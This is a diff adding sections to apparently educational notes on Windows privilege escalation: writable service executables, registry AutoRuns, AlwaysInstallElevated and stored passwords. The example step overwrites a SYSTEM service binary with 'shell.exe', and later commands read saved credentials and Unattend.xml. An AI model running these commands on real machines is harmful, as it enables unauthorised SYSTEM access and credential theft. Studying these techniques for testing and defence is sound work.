@@ -307,3 +307,79 @@ FOR /F "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^
 accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
 
+## Example
+###  Found vulnerable service executable
+#### Step 1: Identify vulnerable service
+
+```
+# Find services with writable executables
+accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+
+#### Step 2: Check service details
+```
+sc qc filepermsvc
+```
+
+**Output**
+```
+BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
+SERVICE_START_NAME : LocalSystem    ← Runs as SYSTEM!
+```
+
+#### Step 4: Create malicious payload
+#### Step 5: Upload payload
+#### Step 6: Replace service executable
+```
+# Copy your shell to service location
+copy /Y C:\Temp\shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+
+#### Step 7: Start listener
+#### Step 8: Restart service
+
+
+# 5) ==Registry AutoRuns== 
+
+## What it is
+Windows runs some programs automatically at startup.
+
+If you can modify AutoRun path → you can run payload.
+
+### Common locations
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+### Requirement
+- key must be writable
+- or file path must be writable
+
+---
+
+# 6) AlwaysInstallElevated
+
+## What it is
+If AlwaysInstallElevated is enabled:
+Any MSI package runs as SYSTEM.
+
+### Check these registry keys
+HKCU\Software\Policies\Microsoft\Windows\Installer
+HKLM\Software\Policies\Microsoft\Windows\Installer
+
+If both have:
+AlwaysInstallElevated = 1
+
+Then system is vulnerable.
+
+---
+
+# 7) Stored Passwords
+## Common locations
+- saved credentials
+- registry stored passwords
+- config files
+- unattended install files
+
+### Useful commands
+cmdkey /list
+type C:\Windows\Panther\Unattend.xml
